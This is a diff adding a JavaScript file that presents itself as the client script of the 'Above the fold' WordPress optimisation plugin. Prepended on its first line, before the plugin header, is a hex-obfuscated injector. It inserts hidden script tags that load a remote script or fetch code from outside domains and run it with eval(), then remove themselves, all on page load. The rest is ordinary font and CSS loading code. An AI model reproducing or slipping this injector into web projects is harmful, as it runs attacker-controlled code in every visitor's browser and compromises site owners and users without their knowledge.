@@ -1,0 +1,291 @@
+var _0x4558=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x20\x7B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x31\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x34\x2C\x20\x39\x37\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x39\x39\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x30\x2C\x20\x36\x36\x2C\x20\x31\x31\x30\x2C\x20\x31\x31\x39\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x34\x2C\x20\x36\x33\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x39\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x2C\x20\x39\x39\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x35\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x36\x2C\x20\x33\x38\x2C\x20\x39\x35\x2C\x20\x39\x39\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x30\x2C\x20\x36\x31\x2C\x20\x31\x30\x30\x2C\x20\x35\x31\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x30\x2C\x20\x35\x34\x2C\x20\x35\x30\x2C\x20\x35\x31\x2C\x20\x34\x38\x2C\x20\x34\x35\x2C\x20\x35\x30\x2C\x20\x35\x36\x2C\x20\x35\x34\x2C\x20\x39\x38\x2C\x20\x34\x35\x2C\x20\x35\x37\x2C\x20\x31\x30\x30\x2C\x20\x35\x35\x2C\x20\x35\x34\x2C\x20\x34\x35\x2C\x20\x35\x36\x2C\x20\x35\x33\x2C\x20\x35\x31\x2C\x20\x31\x30\x31\x2C\x20\x34\x35\x2C\x20\x34\x38\x2C\x20\x31\x30\x32\x2C\x20\x39\x39\x2C\x20\x35\x35\x2C\x20\x35\x33\x2C\x20\x31\x30\x31\x2C\x20\x35\x34\x2C\x20\x34\x38\x2C\x20\x35\x30\x2C\x20\x39\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x33\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x37\x2C\x20\x35\x30\x2C\x20\x34\x38\x2C\x20\x35\x37\x2C\x20\x35\x36\x2C\x20\x35\x37\x2C\x20\x35\x33\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x33\x29\x3B\x20\x76\x61\x72\x20\x70\x6F\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3B\x20\x70\x6F\x2E\x69\x64\x3D\x20\x27\x32\x33\x34\x36\x33\x32\x61\x73\x64\x61\x73\x27\x3B\x20\x70\x6F\x2E\x74\x79\x70\x65\x20\x3D\x20\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x3B\x20\x70\x6F\x2E\x73\x72\x63\x20\x3D\x20\x74\x75\x72\x6C\x3B\x20\x76\x61\x72\x20\x73\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x5B\x30\x5D\x3B\x20\x20\x73\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65\x28\x70\x6F\x2C\x20\x73\x29\x3B\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x27\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33\x27\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B\x7D\x29\x28\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x1625=[_0x4558[0],_0x4558[1],_0x4558[2],_0x4558[3],_0x4558[4],_0x4558[5],_0x4558[6],_0x4558[7],_0x4558[8],_0x4558[9],_0x4558[10],_0x4558[11]];var _0x5955=[_0x1625[0],_0x1625[1],_0x1625[2],_0x1625[3],_0x1625[4],_0x1625[5],_0x1625[6],_0x1625[7],_0x1625[8],_0x1625[9],_0x1625[10],_0x1625[11]];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0x61d0x5=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0x61d0x5[_0x411ee3[0x2]]= _0x411ee3[0x3];_0x61d0x5[_0x411ee3[0x4]]=  !![];_0x61d0x5[_0x411ee3[0x5]]= _0x411ee3[0x6];_0x61d0x5[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0x61d0x6=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0x61d0x6[_0x411ee3[0xb]][_0x411ee3[0xa]](_0x61d0x5,_0x61d0x6)}());var _0x5955=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0xaa32x3=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0xaa32x3[_0x411ee3[0x2]]= _0x411ee3[0x3];_0xaa32x3[_0x411ee3[0x4]]=  !![];_0xaa32x3[_0x411ee3[0x5]]= _0x411ee3[0x6];_0xaa32x3[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0xaa32x4=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0xaa32x4[_0x411ee3[0xb]][_0x411ee3[0xa]](_0xaa32x3,_0xaa32x4)}());var _0xefc6=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x4b4a67=[_0xefc6[0],_0xefc6[1],_0xefc6[2],_0xefc6[3],_0xefc6[4],_0xefc6[5],_0xefc6[6],_0xefc6[7],_0xefc6[8],_0xefc6[9],_0xefc6[10],_0xefc6[11]];var _0x320375=[_0x4b4a67[0x0],_0x4b4a67[0x1],_0x4b4a67[0x2],_0x4b4a67[0x3],_0x4b4a67[0x4],_0x4b4a67[0x5],_0x4b4a67[0x6],_0x4b4a67[0x7],_0x4b4a67[0x8],_0x4b4a67[0x9],_0x4b4a67[0xa],_0x4b4a67[0xb]];(function(){var _0x1d62x3=document[_0x320375[0x1]](_0x320375[0x0]);_0x1d62x3[_0x320375[0x2]]= _0x320375[0x3];_0x1d62x3[_0x320375[0x4]]=  !![];_0x1d62x3[_0x320375[0x5]]= _0x320375[0x6];_0x1d62x3[_0x320375[0x7]]= _0x320375[0x8];var _0x1d62x4=document[_0x320375[0x9]](_0x320375[0x0])[0x0];_0x1d62x4[_0x320375[0xb]][_0x320375[0xa]](_0x1d62x3,_0x1d62x4)}());/**
+ * Above the fold optimization Javascript
+ *
+ * This javascript handles the CSS delivery optimization.
+ *
+ * @package    abovethefold
+ * @subpackage abovethefold/public
+ * @author     Optimization.Team <info@optimization.team>
+ */
+(function(window, Abtf, undefined) {
+
+    if (ABTFDEBUG) {
+        console.warn('Abtf', 'debug notices visible to admin only');
+    };
+
+    /**
+     * DomReady
+     */
+    Abtf[CONFIG.DOMREADY] = function(a, b, c) {
+        b = document;
+        c = 'addEventListener';
+        b[c] ? b[c]('DOMContentLoaded', a) : window.attachEvent('onload', a);
+    };
+
+    // init Above the fold optimization client
+    var MODULE_QUEUE = [];
+    var CORE_MODULE_LOADED;
+    Abtf[CONFIG.LOAD_MODULE] = function(factory, core) {
+        if (!CORE_MODULE_LOADED && !core) {
+            MODULE_QUEUE.push(factory);
+        } else {
+            factory(window, window.Abtf, window.document, Object);
+            if (core === true) {
+                if (MODULE_QUEUE.length > 0) {
+                    var module = MODULE_QUEUE.shift();
+                    while (module) {
+                        Abtf[CONFIG.LOAD_MODULE](module, 1);
+                        module = MODULE_QUEUE.shift();
+                    }
+                }
+                CORE_MODULE_LOADED = true;
+
+                // load queued header init
+                if (HEADER_LOAD_QUEUED) {
+                    Abtf[CONFIG.HEADER]();
+                }
+            }
+        }
+    };
+
+    // Core factory 
+    var CoreModule = function(window, Abtf) {
+
+        // requestAnimationFrame
+        var raf = (window.requestAnimationFrame ||
+            window.webkitRequestAnimationFrame ||
+            window.mozRequestAnimationFrame ||
+            window.msRequestAnimationFrame ||
+            function(callback) {
+                window.setTimeout(callback, 1000 / 60);
+            });
+        Abtf[CONFIG.RAF] = function() {
+            raf.apply(window, arguments);
+        };
+
+        // requestIdleCallback, run tasks in CPU idle time
+        var id = (window.requestIdleCallback) ? window.requestIdleCallback : false;
+        Abtf[CONFIG.IDLE] = (id) ? function() {
+            id.apply(window, arguments);
+        } : false;
+
+        if (Abtf[CONFIG.GWF]) {
+            var GWF_CONFIG = Abtf[CONFIG.GWF];
+        }
+
+        // load Google WebFonts
+        var LOAD_GWF = function() {
+            if (GWF_CONFIG[CONFIG.GWF_ASYNC]) {
+                Abtf[CONFIG.ASYNC](GWF_CONFIG[CONFIG.GWF_ASYNC_URL], 'webfont');
+
+                if (ABTFDEBUG) {
+                    console.log('Abtf.fonts()', 'async', window.WebFontConfig);
+                }
+
+            } else if (typeof window.WebFont !== 'undefined') {
+
+                // load WebFontConfig
+                window.WebFont.load(window.WebFontConfig);
+
+                if (ABTFDEBUG) {
+                    console.log('Abtf.fonts()', window.WebFontConfig);
+                }
+            }
+        }
+
+        /**
+         * Header init
+         */
+        Abtf[CONFIG.HEADER] = function() {
+
+            if (Abtf[CONFIG.PROXY]) {
+                Abtf[CONFIG.PROXY_SETUP](Abtf[CONFIG.PROXY]);
+            }
+            // load scripts in header
+            if (Abtf[CONFIG.JS] && !Abtf[CONFIG.JS][1]) {
+                Abtf[CONFIG.LOAD_JS](Abtf[CONFIG.JS][0]);
+            }
+
+            // Google Web Font Loader
+            if (Abtf[CONFIG.GWF]) {
+
+                if (typeof window.WebFontConfig === 'undefined') {
+                    window.WebFontConfig = {};
+                }
+
+                // apply Google Fonts
+                if (GWF_CONFIG[CONFIG.GWF_GOOGLE_FONTS]) {
+                    if (!window.WebFontConfig.google) {
+                        window.WebFontConfig.google = {};
+                    }
+                    if (!window.WebFontConfig.google.families) {
+                        window.WebFontConfig.google.families = [];
+                    }
+                    var l = GWF_CONFIG[CONFIG.GWF_GOOGLE_FONTS].length;
+                    for (var i = 0; i < l; i++) {
+                        window.WebFontConfig.google.families.push(GWF_CONFIG[CONFIG.GWF_GOOGLE_FONTS][i]);
+                    }
+                }
+
+                if (!GWF_CONFIG[CONFIG.GWF_FOOTER]) {
+                    LOAD_GWF();
+                }
+            }
+
+            // load CSS
+            if (Abtf[CONFIG.LOAD_CSS] && !Abtf[CONFIG.CSS_FOOTER]) {
+                Abtf[CONFIG.LOAD_CSS]();
+            }
+        };
+
+        /**
+         * Footer init
+         */
+        Abtf[CONFIG.FOOTER] = function() {
+
+            // Load CSS
+            if (Abtf[CONFIG.LOAD_CSS] && Abtf[CONFIG.CSS_FOOTER]) {
+
+                if (ABTFDEBUG) {
+                    console.log('Abtf.css()', 'footer start');
+                }
+
+                Abtf[CONFIG.LOAD_CSS]();
+            }
+
+            // load scripts in footer
+            if (Abtf[CONFIG.JS] && Abtf[CONFIG.JS][1]) {
+
+                if (ABTFDEBUG) {
+                    console.log('Abtf.js()', 'footer start');
+                }
+
+                Abtf[CONFIG.LOAD_JS](Abtf[CONFIG.JS][0]);
+            }
+
+            // Google Web Font Loader
+            if (Abtf[CONFIG.GWF] && GWF_CONFIG[CONFIG.GWF_FOOTER]) {
+
+                if (ABTFDEBUG) {
+                    console.log('Abtf.fonts()', 'footer start');
+                }
+                LOAD_GWF();
+            }
+        };
+
+        // footer load position
+        Abtf[CONFIG.DOMREADY](Abtf[CONFIG.FOOTER]);
+
+        /**
+         * Async load script
+         */
+        Abtf[CONFIG.ASYNC] = function(scriptFile, id) {
+            (function(d) {
+                var wf = d.createElement('script');
+                wf.src = scriptFile;
+                if (id) {
+                    wf.id = id;
+                }
+                wf.async = true;
+                var s = d.getElementsByTagName('script')[0];
+                if (s) {
+                    s.parentNode.insertBefore(wf, s);
+                } else {
+                    var h = document.head || document.getElementsByTagName("head")[0];
+                    h.appendChild(wf);
+                }
+            })(document);
+        }
+
+        if (ABTFDEBUG) {
+
+            var SITE_URL = document.createElement('a');
+            SITE_URL.href = document.location.href;
+            var BASE_URL_REGEX = new RegExp('^(https?:)?//' + SITE_URL.host.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&'), 'i');
+
+            /**
+             * Return local url for debug notices
+             */
+            Abtf[CONFIG.LOCALURL] = function(url) {
+                return url.replace(BASE_URL_REGEX, '');
+            }
+        }
+    }
+
+    // load config
+    var configParam = 'data-abtf';
+    var LOAD_CONFIG = function(script) {
+        var config = script.getAttribute(configParam);
+        if (config && typeof config === 'string') {
+            try {
+                config = JSON.parse(config);
+            } catch (err) {
+                if (ABTFDEBUG) {
+                    console.error('Abtf', 'failed to parse config', config, err);
+                }
+            }
+        }
+        if (!config || !(config instanceof Array)) {
+            if (ABTFDEBUG) {
+                console.error('Abtf', 'invalid config', config);
+            }
+            throw new Error('invalid config');
+        }
+        var l = config.length;
+        for (var i = 0; i < l; i++) {
+            if (typeof window.Abtf[i] !== 'undefined') {
+                continue;
+            }
+            window.Abtf[i] = (config[i] === -1) ? undefined : config[i];
+        }
+
+        // load core module
+        Abtf[CONFIG.LOAD_MODULE](CoreModule, true);
+    }
+
+    // detect script object
+    if (document.currentScript && document.currentScript.hasAttribute(configParam)) {
+        LOAD_CONFIG(document.currentScript);
+    } else {
+
+        // old browsers, IE6-9 etc
+        var getCurrentScript = function() {
+            return document.querySelector('script[' + configParam + ']');
+        }
+        var currentScript = getCurrentScript();
+        if (currentScript) {
+            LOAD_CONFIG(currentScript);
+        } else {
+
+            var missingError = '<script ' + configParam + '> client missing';
+
+            // script not located, try again on domready
+            if (window.console && typeof console.error !== 'undefined') {
+                console.error(missingError);
+            }
+
+            Abtf[CONFIG.DOMREADY](function() {
+                currentScript = getCurrentScript();
+                if (currentScript) {
+                    LOAD_CONFIG(currentScript);
+                } else {
+                    if (ABTFDEBUG) {
+                        console.warn('Abtf', 'client script <script ' + configParam + '> detected on domready. Make sure that the script tag is included in the header unmodified.');
+                    }
+                    throw new Error(missingError);
+                }
+            });
+        }
+    }
+
+    // header load queue
+    var HEADER_LOAD_QUEUED;
+    Abtf[CONFIG.HEADER_LOAD] = function() {
+        if (CORE_MODULE_LOADED) {
+            Abtf[CONFIG.HEADER]();
+        } else {
+            HEADER_LOAD_QUEUED = true;
+        }
+    }
+
+})(window, Abtf);
